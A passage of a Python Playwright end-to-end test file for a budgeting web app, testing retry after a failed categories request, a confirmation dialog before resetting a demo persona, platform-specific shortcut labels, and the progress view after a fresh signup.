            calls.append(route.request.url)
            if len(calls) == 1:
                return route.fulfill(status=500, json={"error": "Something went wrong on our side."})
            return route.fallback()

        page.route("**/api/v1/categories", flaky)
        page.goto(server + "/transactions?open=" + purchase["expense_id"])
        drawer = page.locator("aside.b-drawer")
        expect(drawer).to_contain_text(purchase["merchant"])
        expect(drawer.locator("select option")).not_to_have_count(0)  # fetched again after the failure
        page.keyboard.press("Escape")
        expect(drawer).to_be_hidden()
        page.locator(".b-filters button.b-f").first.click()
        expect(page.locator(".b-filters select").nth(1).locator("option")).not_to_have_count(1)
        assert len(calls) >= 2
        assert errors == ["Failed to load resource: the server responded with a status of 500 (Internal Server Error)"], errors
    finally:
        ctx.close()


def test_resetting_a_persona_asks_first(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        sent, asked = [], []

        def reset(route):
            sent.append(route.request.post_data_json)
            route.fulfill(status=202, json={"status": "started", "users": 1})

        def answer(accept):
            def handler(dialog):
                asked.append(dialog.message)
                dialog.accept() if accept else dialog.dismiss()
            return handler

        page.route("**/api/v1/admin/reset", reset)
        _login(page, server, "sam")
        page.goto(server + "/settings")
        page.wait_for_load_state("networkidle")
        button = page.get_by_role("button", name="Reset Maya")
        page.once("dialog", answer(False))
        button.click()
        page.wait_for_timeout(300)
        assert len(asked) == 1 and asked[0].startswith("Reset Maya Chen?") and sent == []
        page.once("dialog", answer(True))
        button.click()
        expect(page.get_by_text("Resetting Maya Chen.")).to_be_visible()
        assert sent == [{"persona": "maya"}]
        assert not errors, errors
    finally:
        ctx.close()


@pytest.mark.parametrize(("platform", "label"), [("MacIntel", "⌘K"), ("Win32", "Ctrl K"), ("Linux x86_64", "Ctrl K")])
def test_the_palette_shortcut_reads_right_on_each_platform(server, browser, platform, label):
    ctx, page, errors = _page(browser, "light")
    try:
        page.add_init_script(f"""
            Object.defineProperty(Navigator.prototype, 'platform', {{ get: () => '{platform}' }});
            Object.defineProperty(Navigator.prototype, 'userAgentData', {{ get: () => undefined }});""")
        _login(page, server, "maya")
        expect(page.locator(".b-ask kbd")).to_have_text(label)
        assert not errors, errors
    finally:
        ctx.close()


def test_a_fresh_signup_shows_progress_not_zeros(server, browser):
    ctx, page, errors = _page(browser, "light")
    try:
        page.goto(server + "/login")
        page.fill('#name-form input[name="username"]', f"ui-{int(time.time())}")
        page.locator("#name-form button[type=submit]").click()
        page.wait_for_selector("#signup-section", state="visible")
        page.locator("#name-form button[type=submit]").click()
        page.wait_for_url(server + "/")
        page.wait_for_selector("text=Setting up your accounts", state="visible", timeout=15000)
        assert page.locator('section[x-data="dashboardPage"] > .b-grid').first.is_hidden()
        assert not errors, errors
    finally:
        ctx.close()
